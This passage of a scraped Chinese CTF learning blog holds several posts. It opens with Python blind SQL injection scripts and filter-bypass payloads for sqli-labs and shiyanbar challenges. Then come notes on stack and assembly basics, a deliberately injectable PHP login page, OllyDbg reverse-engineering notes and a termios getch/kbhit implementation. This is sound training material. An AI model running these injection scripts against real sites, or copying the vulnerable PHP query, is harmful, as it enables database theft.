\", res)def get_tables(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and if((substr((select group_concat(table_name separator ';') from information_schema.tables where table_schema='security'),&#123;&#125;,1)='&#123;&#125;'),sleep(4),1)%23\".format(i, ch) try: r = requests.get(url + sql, timeout=3.9) except requests.exceptions.ReadTimeout: res += ch print(res) break print(\"Table names: \", res)def get_columns(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and if((substr((select group_concat(column_name separator ';') from information_schema.columns where table_name='uagents' and table_schema=database()),&#123;&#125;,1)='&#123;&#125;'),sleep(4),1)%23\".format(i, ch) try: r = requests.get(url + sql, timeout=3.9) except requests.exceptions.ReadTimeout: res += ch print(res) break print(\"Column names: \", res)def get_flag(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and if((substr((select group_concat(password separator ';') from security.users),&#123;&#125;,1)='&#123;&#125;'),sleep(4),1)%23\".format(i, ch) try: r = requests.get(url + sql, timeout=3.9) except requests.exceptions.ReadTimeout: res += ch print(res) break print(\"Flag: \", res)if __name__ == '__main__': # get_databse() # 库名：security # get_tables() # 列名：emails;referers;uagents;users # get_columns() # 表名：1.id;email_id 2.id;referer;ip_address(ip_addkess) 3.id;uagent;ip_address;username 4.id;username(usernahe);password(passkord) # 由于时间盲注会受到网络的影响，需要多试几次来提高结果的精确度 # 根据以上的结果可以认为需要找的东西在users表中的password字段 get_flag() # dumb;i0kill-you;p@ssword;crappyustupidity;genious;mob!le;admie;admin1;admin2;admin3;dumbo0dmin4 源码如下： less-25就是过滤了 AND 和 OR，其他的话和 DVWA 的 LOW LEVEL SQL INJECTION 是一样的 这里 information_schema 库名中也有 or，要记得双写 password 中的 or 也会被过滤 less-26已经能猜到表中有三个字段，所以就不测字段，然后用%A0 替代空格，用%26%26(&amp;&amp;)替代 AND，写出 payload： 10%27%A0union%A0select%A01,database(),3%26%26%271 因为注释符都被过滤了，所以语句最后通过加上“and ‘1”来绕过 网页源码是这样的，过滤了好多东西： less-27用大小写交替来绕过过滤，其他过滤和上一题相同，于是直接写出 payload： 10%27uNion%a0SeleCt%a01,database(),3%a0%26%26%271 网页源码： 实验吧简单的 sql 注入简单的 sql 注入通过注入获得 flag 值（提交格式：flag{}）。解题链接 这里过滤了很多关键字，需要尝试多次以后才能构造出正确的 payload。以下为每一步的 payload。 获取库名： 1' unionunion selectselect database() ' 获取表名： 1' unionunion selectselect table_name fromfrom information_schema.tables wherewhere table_table_schemaschema='web1 获取列名： 1' unionunion selectselect column_namcolumn_namee fromfrom information_schema.coluinformation_schema.columnsmns wherewhere table_table_schemaschema='web1' andand table_name='flag 得到 flag： 1' unionunion selectselect flag fromfrom web1.flag wherewhere '1'='1 简单的 sql 注入 3mysql 报错注入格式：flag{}解题链接 依次输入1 and 1=1和1 and 1=2，发现存在布尔盲注。 经过上一题直接猜测表名为flag（如果和上一题一样就可以直接写爆破 flag 的脚本了），返回 hello，说明确实有flag这个表。那么就可以直接写脚本爆破了。 直接爆破 flag 表 flag 字段得到 flag。脚本如下： 12345678910111213141516171819import requests, repayload = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#123;&#125;_!@#$^&amp;*().-\"url = \"http://ctf5.shiyanbar.com/web/index_3.php\"def get_flag(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"?id=1' and (select flag from flag) like '&#123;&#125;&#123;&#125;%'%23\".format(name, ch) r = requests.get(url + sql) if r.text.find('Hello!') != -1: res += ch print(res) break print(\"flag: \" + res)if __name__ == '__main__': get_flag() 参考网站https://www.2cto.com/database/201607/529000.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"web","slug":"web","permalink":"blog.b3ale.cn/tags/web/"}]},{"title":"PWN入门（一）","slug":"PWN入门（一）","date":"2018-07-03T02:32:36.000Z","updated":"2019-08-26T05:53:07.756Z","comments":true,"path":"2018/07/03/PWN入门（一）/","link":"","permalink":"blog.b3ale.cn/2018/07/03/PWN入门（一）/","excerpt":"学好二进制必须先打好基础。","text":"学好二进制必须先打好基础。 了解了电脑中的程序如何运行，以及栈在程序运行时是如何变化的。 程序运行基本原理CPU 访问快慢的速度依次为：寄存器-&gt;缓存-&gt;内存-&gt;硬盘。 硬盘用于永久存储所有的数据。当程序运行时，程序内容会被放进内存中，占用内存的空间。缓存和寄存器则相对速度更快，作为数据和 CPU 之间连接的桥梁。 寄存器CPU 内部用来存放数据的一些小型存储区域，用来暂时存放参与运算的数据和运算结果。和 CPU 速度相当，空间比较小在 kb 级别。CPU 访问寄存器的速度是最快的。寄存器是一种容量有限的存储器，并且非常小，因此只把一些计算机的指令等一些计算机频繁用到的数据存储在其中，加快直接同内存读取指令和读写数据的速度。 缓存（CACHE）存在于内存与 CPU 之间的存储器，容量比较小但速度比内存高得多，接近于 CPU 的速度，比寄存器要慢 1 倍左右，但是空间可以达到 MB 级别。高速缓存在 CPU 要频繁访问内存中的一些数据时，如果每次都从内存中去读，花费的时间会更多，因此在寄存器和内存之间有了缓存，把 CPU 要频繁访问的一些数据存储在缓冲中，这样效率就会更高。但需要注意的是，缓冲的大小也是很小的，不能存放大量的数据。缓存又可以分为一级和二级缓存，一级的速度大于二级的速度。CPU 向内存读取数据时，首先查询缓存区是否有对应数据，如果有则直接读取，没有再从内存中读取。 内存计算机运行过程中的存储主力，用于存储 指令（编译好的代码段），运行中的各个静态，动态，临时变量，外部文件的指针等等。寄存器和高速缓存只是加速存储速度的中间部件，原始运行文件都是先加入到内存中，因此内存的大小决定了一个可运行程序的最大大小。速度比缓存要慢 10 倍左右，但是空间可以达到 GB 级别，当前个人电脑一般都不小于 4G。分为只读（ROM）和随机存储器（RAM）。 硬盘用来存储需要永久存储的文件，归入外存储器，访问速度比内存要慢上万倍，但是价格也比较便宜，空间也很大。 ASCII 码 123456#include&lt;stdio.h&gt;int main()&#123; printf(\"%d\\n\", 'A'); printf(\"%c\\n\", 65);&#125; 小端序数据的高位字节存放在地址的高端，低位字节存放在地址的低端 不同类型数据的字节长度 sizeof(int): 4 bit sizeof(short): 2 bit sizeof(float): 4 bit sizeof(double): 8 bit sizeof(char): 1 bit 不同类型数据的小端序存储方式 int 0x12345678: 78 56 34 12 char [] “1234”: 30 31 32 33 00 short 0xdead: ad de short 0x12345678: 34 12 78 56 栈 先进后出 从高地址向低地址延伸 作用： 暂时保存变量 调用函数时传递参数 保存函数返回地址 调试 SWAP 程序12345678910111213141516#include&lt;stdio.h&gt;void swap(int *aa, int *bb)&#123; int cc = *aa; *aa = *bb; *bb = cc;&#125;int main()&#123; int a = 100, b = 2; swap(&amp;a, &amp;b); printf(\"%d %d\\n\", a, b); return 0;&#125; 表格模拟程序执行时的栈： ADDRESS VALUE NAME 0x7ffee7574978 2 b 0x7ffee7574974 100 a 0x7ffee7574970 0x7ffee7574978 bb 0x7ffee757496c 0x7ffee7574974 aa 0x7ffee7574968 ?? cc 流程图模拟程序执行时的栈： 以下为在 mac 下反汇编出的代码，基本和 linux 下的一致，但是和 windows 下的有一定区别： 12345678910111213141516 0x10958ff10 &lt;+0&gt;: pushq %rbp 0x10958ff11 &lt;+1&gt;: movq %rsp, %rbp 0x10958ff14 &lt;+4&gt;: movq %rdi, -0x8(%rbp) 0x10958ff18 &lt;+8&gt;: movq %rsi, -0x10(%rbp)-&gt; 0x10958ff1c &lt;+12&gt;: movq -0x8(%rbp), %rsi 0x10958ff20 &lt;+16&gt;: movl (%rsi), %eax 0x10958ff22 &lt;+18&gt;: movl %eax, -0x14(%rbp) 0x10958ff25 &lt;+21&gt;: movq -0x10(%rbp), %rsi 0x10958ff29 &lt;+25&gt;: movl (%rsi), %eax 0x10958ff2b &lt;+27&gt;: movq -0x8(%rbp), %rsi 0x10958ff2f &lt;+31&gt;: movl %eax, (%rsi) 0x10958ff31 &lt;+33&gt;: movl -0x14(%rbp), %eax 0x10958ff34 &lt;+36&gt;: movq -0x10(%rbp), %rsi 0x10958ff38 &lt;+40&gt;: movl %eax, (%rsi) 0x10958ff3a &lt;+42&gt;: popq %rbp 0x10958ff3b &lt;+43&gt;: retq Linux 下采用的是 AT＆T 的汇编语法格式，Windows 下面采用的是 Intel 汇编语法格式。二者的主要区别在于： 指令操作数的赋值方向是不同的Intel：第一个是目的操作数，第二个是源操作数AT＆T：第一个是源操作数，第二个是目的操作数 指令前缀AT＆T：寄存器前边要加上％，立即数前要加上$Intel：没有这方面的要求 内存单元操作数Intel：基地址使用[]AT&amp;T：基地址使用()比如：intel 中mov ax, [bx]；AT&amp;T 中movl (%eax), %ebx 操作码的后缀AT&amp;T 中操作码后面有一个后缀字母: l 32 位, w 16 位, b 8 位Intel 却使用了在操作数前面加dword ptr, word ptr, byte ptr的格式例如: mov al, bl(Intel)；movb %bl, %al(AT&amp;T) AT＆T 中跳转指令标号后的后缀表示跳转方向，f表示向前，b表示向后 参考网站https://blog.csdn.net/sinat_37138973/article/details/79012270https://blog.csdn.net/younkerjqb/article/details/53432422https://blog.csdn.net/chuchus/article/details/38469403","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"blog.b3ale.cn/tags/pwn/"}]},{"title":"WEB入门（一）","slug":"WEB入门（一）","date":"2018-07-02T04:38:52.000Z","updated":"2019-08-26T05:48:06.582Z","comments":true,"path":"2018/07/02/WEB入门（一）/","link":"","permalink":"blog.b3ale.cn/2018/07/02/WEB入门（一）/","excerpt":"今天上午是葛大佬的课，继续好好做笔记。","text":"今天上午是葛大佬的课，继续好好做笔记。 对数据库的概念更清楚了，通过自己搭建一个有注入的网页对 PHP 和 HTML 的基本函数有了更好的理解。 PHPPHP 脚本以&lt;?PHP开头，以?&gt;结尾，默认文件扩展名为.php。PHP 语句以分号;结尾。 注释12345// 单行注释# 单行注释/*多行注释*/ 变量规则 变量以\\$符号开头 变量名称必须以字母或下划线开头 变量名称不能以数字开头 变量名称只能包含字母数字字符和下划线（A-Z、a-z、0-9以及_） 变量名称对大小写敏感 1234567&lt;?php $a = 'I am a'; $b = 'I am b'; echo '$a'; echo '&lt;br&gt;'; echo \"$b\";?&gt; 三层架构中的信息流 URL统一资源定位符，提供资源（通常是文档）的路径或位置。结构如下： 1协议://授权/路径?查询 GET 请求和 POST 请求HTTP 中定义的客户端可以发送服务器的两种操作 GET从服务器查询数据方式：用?分割 url 和查询的数据 POST向服务器传递数据方式：通过 form 表单传递 PHP 与 MYSQLGET 方法传递参数12345678&lt;?php$id=$_GET['id'];if(!is_numeric($id))&#123; echo \"U r a hacker!&lt;br&gt;\";&#125;else&#123; echo \"Connecting database!&lt;br&gt;\";&#125;?&gt; PS：&lt;br&gt;为换行符 POST 方法传递参数12345&lt;form action=\"test.php\" method=\"post\"&gt;Pls input ur id: &lt;input type=\"text\" name=\"id\" /&gt;&lt;input type=\"submit\" /&gt;&lt;/form&gt;U r NO.&lt;?php echo $_POST['id']; ?&gt; visitor! 与 mysql 相关函数连接数据库1mysql_connect(servername, username, password); 参数 描述 servername 可选。规定要连接的服务器，默认是“localhost:3306” username 可选。规定登陆所使用的用户名，默认是拥有服务器进程的用户名的名称 password 可选。规定登陆所用的密码，默认是“” 选取数据1mysql_query(query, connection); 参数 描述 query 必需。规定要发送的 sql 查询 connection 可选。规定 sql 连接标识符 设置活动的数据库1mysql_select_db(database, connection); 参数 描述 database 必需。规定要选择的数据库 connection 可选。规定 mysql 连接，如未指定，使用上一个连接 获取数据1mysql_fetch_array(data, array_type); 参数 描述 data 可选。规定要使用的数据指针 array_type 可选。规定返回结果 MYSQL 命令行指令更改密码12update mysql.user set password=password('test') where username='root';flush privileges; 查看数据库1show databases; 选择数据库1use mysql; 查看当前数据库所有数据表1show tables; 查看某张表所有字段信息1desc users; 创建数据库1create database mysql; 删除数据库1drop database mysql; 创建表名为 users 的数据表（其中 id 为主键自增）123456create table users( id int auto_increment, username varchar(20), password varchar(50), primary key (`id`)); 修改表名1alter table users rename to users2; 往表中插入数据1insert into users(...) value(...); 查询表中字段的数据类型1show create table mysql; MYSQL 相关命令及注释命令 AND：所有由 AND 连接的条件都为 TRUE，SQL 语句才执行 OR：只要 OR 连接的条件里有一个是 TRUE，SQL 语句就会执行 UNION SELECT：联合查询 GROUP BY：表示按照第几列进行排序 GROUP_CONCAT：将查询结果以一行的形式输出 注释12345-- 单行注释# 单行注释/*多行注释*/ SQL 手注练习 判断有无注入点 判断注入类型 判断表中字段数 UNION 查询库名 UNION 查询表名 UNION 查询字段名 UNION 查询内容（得到 flag） 自己搭建一个 POST 方式的字符型 SQL 注入网站本地数据库如下： 源码如下： 1234567891011121314151617181920212223242526&lt;?PHP$id = $_POST['id'];$conn = mysql_connect('127.0.0.1', 'root', 'root');if($conn)&#123; echo \"Connected success!&lt;br&gt;\";&#125;else&#123; echo \"Connected fail!&lt;br&gt;\";&#125;$db_selected = mysql_select_db('qf', $conn);$sql = \"select * from test1 where id='$id'\";$res = mysql_query($sql, $conn);while($row = mysql_fetch_array($res))&#123; echo \"username: \".$row['username'].\"&lt;br&gt;\"; echo \"age: \".$row['age'].\"&lt;br&gt;\"; echo \"sex: \".$row['sex'].\"&lt;br&gt;\";&#125;mysql_close($conn);echo \"ur sql is:\";echo \"select * from test1 where id='$id'\";?&gt; 1234&lt;form action=\"\" method=\"post\"&gt; Pls input ur id: &lt;input type=\"text\" name=\"id\" /&gt;&lt;br /&gt; &lt;input type=\"submit\" name=\"\" , value=\"submit\" /&gt;&lt;/form&gt; 以下为在本地注入时的过程，与 get 方式的注入过程没有什么差别，所以省去了判断的过程，直接注入 查询库名 查询表名 查询字段名 查询内容（得到 flag）","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"web","slug":"web","permalink":"blog.b3ale.cn/tags/web/"}]},{"title":"RE入门（一）","slug":"RE入门（一）","date":"2018-07-01T05:26:43.000Z","updated":"2019-08-28T05:04:29.574Z","comments":true,"path":"2018/07/01/RE入门（一）/","link":"","permalink":"blog.b3ale.cn/2018/07/01/RE入门（一）/","excerpt":"基础汇编知识以及 OD 的使用。","text":"基础汇编知识以及 OD 的使用。 数值表示二进制-b（binary）、十进制-d（decimalism）、十六进制-h（hexadecimal） 字长： bit：位 byte：字节–1byte=8bit word：字–1word=2byte=16bit dword：双字–1dword=2word=4byte=32bit qword：四字–1qword=2dword=4word=8byte=64bit 通用寄存器 EAX：累加器（accumulator），是加法乘法指令的缺省寄存器。还可以用来存储函数返回值 ECX：重复 REP 和 LOOP 指令的计数器（counter） EDX：用于存放整数除法产生的余数 EBX：在内存寻址时用来存放基地址（base） ESP：当前线程的栈顶指针，压入栈的数据越多，ESP 越小，每入栈一次减小 4 字节 EBP：当前线程的栈底指针 ESI/EDI：源/目标索引寄存器，字符串操作中，DS:ESI 指向源串，ES:EDI 指向目标串。 EIP：存放下一个 CPU 指令的内存地址，执行完后读取下一指令 标志寄存器 CF：进位标志（可检查无符号操作是否溢出） OF：零标志 SF：符号标志 PF：溢出标志（补码溢出） 寄存器寻址 立即数寻址：MOV EAX, 123H 寄存器寻址：MOV EAX, EBX（EBX 中存放操作数） 直接寻址：MOV EAX, [12345678H]（操作数以[]为地址） 寄存器间接寻址：MOV EAX, [EBX]（操作数的地址为 EBX 中存储的值） 基本汇编指令数据传输 指令 作用 MOV 赋值 PUSH 入栈 POP 出栈 LEA 取地址 MOVSX 符号传送 PUSHAD 将所有 32 位通用寄存器压入栈 POPAD 将所有 32 位通用寄存器取出栈 算术运算 指令 作用 ADD 加法 INC 自加 SUB 减法 DEC 自减 CMP 比较 MUL 乘法 DIV 除法 IDIV 符号整除 IMUL 符号乘法 NEG 求补 逻辑运算 指令 作用 AND 与运算 OR 或运算 NOT 非运算 XOR 异或运算 TEST 与运算（只对标志位修改，对操作数没有影响） SHL 逻辑左移 SAL 算术左移 SHR 逻辑右移 SAR 算术右移 ROL 循环左移 ROR 循环右移 RCL 进位循环左移 RCR 进位循环右移 转移指令 指令 作用 JMP 跳转 JA 大于时跳转（&gt;） JNA 不大于时跳转（&lt;=） JAE 大于等于时跳转（&gt;=） JB 小于时跳转（&lt;） JNB 不小于时跳转（&gt;=） JBE 小于等于时跳转（&lt;=） JE 相等时跳转（==） JNE 不等于时跳转（!=） JNBE 不小于等于时跳转（&gt;） JG 大于时跳转（有符号）（&gt;） JNG 不大于时跳转（有符号）（&lt;=） JGE 大于等于时跳转（有符号）（&gt;=） JL 小于时跳转（有符号）（&lt;） JNL 不小于时跳转（有符号）（&gt;=） JLE 小于等于时跳转（有符号）（&lt;=） JNGE 不大于等于时跳转（有符号）（&lt;） JNLE 不小于等于时跳转（有符号）（&gt;） JZ ZF 为 0 时跳转 JNZ ZF 不为 0 时跳转 JS 有符号时跳转 JNS 无符号时跳转 JGE：Jump if Greater or Equal 循环指令 指令 作用 LOOP 循环（改变 ECX 的值） JCXZ 循环（不改变 ECX 的值） 串指令 指令 作用 MOVS[B/W/D] 传送字节串/字串/双字串 CMPS[B/W/D] 比较字节串/字串/双字串 SCAS[B/W/D] 扫描字节串/字串/双字串 LODS[B/W/D] 加载源变址字节串/字串/双字串 STOS[B/W/D] 保存字节串/字串/双字串 REP 重复 其他指令 指令 作用 INT 终止程序 CALL 调用函数 RET 过程返回 NOP 空 CLD 方向清零 OD 初探静态调试与动态调试：静态调试就是在不执行程序的情况下，人工地对源代码的语法和逻辑分析；动态调试则是在编译、链接、运行的整个过程中，观察如寄存器内容、函数执行情况等状态来分析调试 L(og):日志信息 E(xecute modules):模块信息 M(emory map):内存映射信息 T(hreads):线程信息 W(indows):窗口信息 H(andles):句柄信息 C:当前线程上下文 K:调用链信息 …… OD 调试快捷键 快捷键 功能 ctrl+g 跳转到指定位置 ctrl+e 编辑指定区域 space 编辑汇编代码 f4 执行到光标位置处 f2 断点（Int3） ; 添加注释 : 添加标签名 * 返回到正在运行的地方 -(+) 返回到上（下）一个光标处 enter 跟随跳转/跟入调用内部 f3 打开一个新的可执行程序 ctrl+f2 重新运行当前调试的程序 f9 运行选定的程序进行调试 f12 暂时停止被调试程序的执行 f7 单步进入被调试程序的 call 中 f8 步过被调试程序的 call ctrl+f9 执行直到返回 第一次调试（helloworld.exe）关于 PE 文件的 EntryPoint。打开 CFF，将 PE 文件拖入： 其中，ImageBase 和 AddressOfEntryPoint 指向的地址即为 EntryPoint 找到 main 函数 代码执行：通过 F7 单步步入，一步一步执行到弹框跳出时，进入 main 函数 层层推进：通过 F8 单步步过，快速跳过每个函数，跳出弹框后，进入 main 函数 字符串检索：根据弹框上方的字符串，右键智能搜索查找，找到后直接进入 main 函数 API 检索法：通过运行程序可以判断文件句柄是 MessageBox，在模块中找到后依次设置断点，运行程序，在主函数断电处停下 特征法：根据 C 语言的反汇编特征进行判断 修改内容 Fact.exe jge 表示大于或等于时跳转。当输入数字 n 时，EDX 存放值 n，ECX 中的值初始化为 1，[local.3]中的值也为 1，每次循环时，ECX 中的值自加一，[local.3]的值为自身再乘上 ECX 中的值。当 ECX 等于 EDX 时跳出循环，而不再进行下一次乘法，最后[local.3]中的值为(n-1)!，故应该将 jge 修改为 jg 即可 参考网站https://www.cnblogs.com/qq78292959/archive/2012/07/20/2600865.htmlhttps://blog.csdn.net/qq_34717555/article/details/77727176https://blog.csdn.net/hanchaoman/article/details/9187093","categories":[],"tags":[{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"}]},{"title":"Unix/Linux下实现Windows中conio.h头文件部分函数","slug":"Unix-Linux下实现Windows中conio-h头文件部分函数","date":"2018-06-19T13:38:18.000Z","updated":"2019-11-07T01:55:53.066Z","comments":true,"path":"2018/06/19/Unix-Linux下实现Windows中conio-h头文件部分函数/","link":"","permalink":"blog.b3ale.cn/2018/06/19/Unix-Linux下实现Windows中conio-h头文件部分函数/","excerpt":"最近在写数据结构大作业，因为在写五子棋的时候不知道怎么实现通过键盘来实现移动和下子，了解到了windows下的conio.h头文件。但是由于我用的是unix系统，需要自己来实现。","text":"最近在写数据结构大作业，因为在写五子棋的时候不知道怎么实现通过键盘来实现移动和下子，了解到了windows下的conio.h头文件。但是由于我用的是unix系统，需要自己来实现。 主要实现getch()和kbhit()两个函数。 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;termios.h&gt; //Linux专用头文件，用于实现getch()、kbhit()#include &lt;unistd.h&gt; //定义了大量针对系统调用的封装的接口 提供对 POSIX 操作系统 API 的访问功能#include &lt;fcntl.h&gt; //定义了很多宏和函数原型 对文件的打开、数据写入、数据读取、关闭文件的操作#include &lt;stdio.h&gt;int getch() //输入不需要回车键便返回&#123; struct termios tm, tm_old; if(tcgetattr(STDIN_FILENO, &amp;tm) &lt; 0) //STDIN_FILENO是终端文件描述符，是一个打开文件句柄 return -1; tm_old = tm; cfmakeraw(&amp;tm); //设置串口属性 将终端设置成原始模式，此时终端是不可回显的 if(tcsetattr(STDIN_FILENO, TCSANOW, &amp;tm) &lt; 0) //更改终端设置 return -1; int ch = getchar(); if(tcsetattr(STDIN_FILENO, TCSANOW, &amp;tm_old) &lt; 0) //恢复终端原始设置 return -1; return ch;&#125;int kbhit() //检测键盘是否有输入&#123; struct termios oldt, newt; //控制终端状态的数据结构 int ch; int oldf; tcgetattr(STDIN_FILENO, &amp;oldt); //得到当前终端的状态 newt = oldt; //设置新的终端属性：ICANON和ECHO取反，表示关闭输入行编辑模式，即能够直接读入字符 newt.c_lflag &amp;= ~(ICANON | ECHO); //ICANON：如果在输入中看到&apos;\\n&apos;或者&apos;EOF&apos;，会返回缓冲区内容 //ECHO：控制回显 tcsetattr(STDIN_FILENO, TCSANOW, &amp;newt); //TSCSANOW：告诉函数立即改变终端的STDIN_FILENO的属性值 oldf = fcntl(STDIN_FILENO, F_GETFL, 0); //获取flags，即open函数的第二个参数 //fcntl()的返回值与命令有关。如果出错，所有命令都返回－1，如果成功则返回某个其他值 fcntl(STDIN_FILENO, F_SETFL, oldf | O_NONBLOCK); //增加一个flags，把文件设置成非阻塞 //F_SETFL设置文件状态标记 ch = getchar(); tcsetattr(STDIN_FILENO, TCSANOW, &amp;oldt); //恢复终端设置 fcntl(STDIN_FILENO, F_SETFL, oldf); if(ch != EOF) &#123; ungetc(ch, stdin); //把字符退回到输入流 return 1; &#125; return 0;&#125; getch()1234567891011121314int getch() //输入不需要回车键便返回&#123; struct termios tm, tm_old; if(tcgetattr(STDIN_FILENO, &amp;tm) &lt; 0) //STDIN_FILENO是终端文件描述符，是一个打开文件句柄 return -1; tm_old = tm; cfmakeraw(&amp;tm); //设置串口属性 将终端设置成原始模式，此时终端是不可回显的 if(tcsetattr(STDIN_FILENO, TCSANOW, &amp;tm) &lt; 0) //更改终端设置 return -1; int ch = getchar(); if(tcsetattr(STDIN_FILENO, TCSANOW, &amp;tm_old) &lt; 0) //恢复终端原始设置 return -1; return ch;&#125; termios结构体1234567struct termios&#123; tcflag_t c_iflag; /* Input modes */ tcflag_t c_oflag; /* Output modes */ tcflag_t c_cflag; /* Control modes */ tcflag_t c_lflag; /* Local modes */ cc_t c_cc[NCCS]; /* Control characters */&#125;; 格字段的选项如下： c_iflag 键值 说明 BRKINT 接到BREAK时产生SIGINT； ICRNL 将输入的CR转换为NL； IGNBRK 忽略BREAK条件； IGNCR 忽略CR； IGNPAR 忽略奇偶错字符； IMAXBEL 在输入队列空时振铃； INLCR 将输入的NL转换为CR； INPCK 打开输入奇偶校验； ISTRIP 剥除输入字符的第8位； IUCLC 将输入的大写字符转换成小写字符(仅SVR4)； IXANY 使任一字符都重新起动输出； IXOFF 使起动/停止输入控制流起作用； IXON 使起动/停止输出控制流起作用； PARMRK 标记奇偶错； c_oflag 键值 说明 BSDLY 退格延迟屏蔽(仅SVR4)； CRDLY CR延迟屏蔽(仅SVR4)； FFDLY 换页延迟屏蔽(仅SVR4)； NLDLY NL延迟屏蔽(仅SVR4)； OCRNL 将输出的CR转换为NL(仅SVR4)； OFDEL 填充符为DEL，否则为NUL(仅SVR4)； OFILL 对于延迟使用填充符(仅SVR4)； OLCUC 将输出的小写字符转换为大写字符(仅SVR4)； ONLCR 将NL转换为CR-NL； ONLRET NL执行CR功能(仅SVR4)； ONOCR 在0列不输出CR(仅SVR4)； ONOEOT 在输出中删除EOT字符(仅4.3+BSD)； OPOST 执行输出处理； OXTABS 将制表符扩充为空格(仅4.3+BSD)； TABDLY 水平制表符延迟屏蔽(仅SVR4)； VTDLY 垂直制表符延迟屏蔽(仅SVR4)； c_cflag 键值 说明 CCTS_OFLOW 输出的CTS流控制(仅4.3+BSD)； CIGNORE 忽略控制标志(仅4.3+BSD)； CLOCAL 忽略解制解调器状态行； CREAD 启用接收装置； CRTS_IFLOW 输入的RTS流控制(仅4.3+BSD)； CSIZE 字符大小屏蔽； CSTOPB 送两个停止位，否则为1位； HUPCL 最后关闭时断开； MDMBUF 经载波的流控输出(仅4.3+BSD)； PARENB 进行奇偶校； PARODD 奇校，否则为偶校； c_lflag 键值 说明 ALTWERASE 使用替换WERASE算法(仅4.3+BSD)； ECHO 进行回送； ECHOCTL 回送控制字符为^(char)； ECHOE 可见擦除符； ECHOK 回送kill符； ECHOKE kill的可见擦除； ECHONL 回送NL； ECHOPRT 硬拷贝的可见擦除方式； FLUSHO 刷清输出； ICANON 规范输入； IEXTEN 使扩充的输入字符处理起作用； ISIG 使终端产生的信号起作用； NOFLSH 在中断或退出键后不刷清； NOKERNINFO STATUS不使内核输出(仅4.3+BSD)； PENDIN 重新打印； TOSTOP 对于后台输出发送SIGTTOU； XCASE 规范大/小写表示(仅SVR4)； 各标志的含义如下： 标志 含义 ALTWERASE (c_lflag, 4.3+BSD)此标志设置时，若输入了WERASE字符，则使用一个替换的字擦除算法。它不是向后移动到前一个白空字符为止，而是向后移动到第一个非字母、数字符为止。 BRKINT (c_iflag, POSIX.1)若此标志设置，而IGNBRK未设置，则在接到BREAK时，输入、输出队列被刷清，并产生一个SIGINT信号。如果此终端设备是一个控制终端，则将此信号送给前台进程组各进程。如果IGNBRK和BRKINT都没有设置，但是设置了PARMRK，则BREAK被读作为三个字节序列/377，/0和/0，如果PARMRK也没有设置，则BREAK被读作为单个字符/0。 BSDLY (c_oflag, SVR4)退格延迟屏蔽，此屏蔽的值是BS0或BS1。 CCTS_OFLOW (c_cflag, 4.3+BSD)输出的CTS流控制。 CIGNORE (c_cflag, 4.3+BSD)忽略控制标志。 CLOCAL (c_cflag, POSIX.1)如若设置，则忽略调制解调器状态线。这通常意味着该设备是本地连接的。若此标志未设置，则打开一个终端设备常常会阻塞到调制解调器回应。 CRDLY (c_oflag, SVR4)回车延迟屏蔽。此屏蔽的值是CR0、CR1、CR2和CR3。 CREAD (c_cflag, POSIX.1)如若设置，则接收装置被启用，可以接收字符。 CRTS_IFLOW (c_cflag, 4.3+BSD)输入的RTS流控制。 CSIZE (c_cflag, POSIX.1)此字段是一个屏蔽标志，它指明发送和接收的每个字节的位数。此长度不包括可能有的奇偶校验位。由此屏蔽定义的字段值是CS5、CS6、CS7和CS8，分别表示每个字节包含5、6、7和8位。 CSTOPB (c_cflag, POSIX.1)如若设置，则使用两位作为停止位，否则只使用一位作为停止位。 ECHO (c_lflag, POSIX.1)如若设置，则将输入字符回送到终端设备。在规范方式和非规范方式下都可以回送字符。 ECHOCTL (c_lflag, SVR4和4.3+BSD)如若设置并且ECHO也设置，则除ASCII TAB、ASCII NL、START和STOP字符外，其他ASCII控制符(ASCII字符集中的0～037)都被回送为^X，其中，X是相应控制字符代码值加0100所构成的字符。这就意味着ASCII Ctrl-A字符(01)被回送为^A。ASCII DELETE字符(0177)则回送为^?。如若此标志未设置，则ASCII控制字符按其原样回送。如同ECHO标志，在规范方式和非规范方式下此标志对控制字符回送都起作用。应当了解的是，某些系统回送EOF字符产生的作用有所不同，其原因是EOF的典型值是Ctrl-D，而这是ASCII EOT字符，它可能使某些终端挂断。 ECHOE (c_lflag, POSIX.1)如若设置并且ICANON也设置，则ERASE字符从显示中擦除当前行中的最后一个字符。这通常是在终端驱动程序中写三个字符序列：退格，空格，退格实现的。如若支持WERASE字符，则ECHOE用一个或若干个上述三字符序列擦除前一个字。如若支持ECHOPRT标志，则在这里所说明的ECHOE动作假定ECHOPRT标志没有设置。 ECHOK (c_lflag, POSIX.1)如若设置并且ICANON也设置，则KILL字符从显示中擦除当前行，或者输出NL字符(用以强调已擦除整个行)。如若支持ECHOKE标志，则这里的说明假定ECHOKE标志没有设置。 ECHOKE (c_lflag, SVR4和4.3+BSD)如若设置并且ICANON也设置，则回送KILL字符的方式是擦去行中的每一个字符。擦除每个字符的方法则由ECHOE和ECHOPRT标志选择。 ECHONL (c_lflag, POSIX.1)如若设置并且ICANON也设置，即使没有设置ECHO也回送NL字符。 ECHOPRT (c_lflag, SVR4和4.3+BSD)如若设置并且ICANON和ECHO也都设置，则ERASE字符(以及WERASE字符，若受到支持)使所有正被擦除的字符按它们被擦除的方式打印。在硬拷贝终端上这常常是有用的，这样可以确切地看到哪些字符正被擦去。 FFDLY (c_oflag, SVR4)换页延迟屏蔽。此屏蔽标志值是FF0或FF1。 FLUSHO (c_lflag, SVR4和4.3+BSD)如若设置，则刷清输出。当键入DISCARD字符时设置此标志，当键入另一个DISCARD字符时，此标志被清除。设置或清除此终端标志也可设置或清除此条件。 HUPCL (c_cflag, POSIX.1)如若设置，则当最后一个进程关闭此设备时，调制解调器控制线降至低电平(也就是调制解调器的连接断开)。 ICANON (c_lflag, 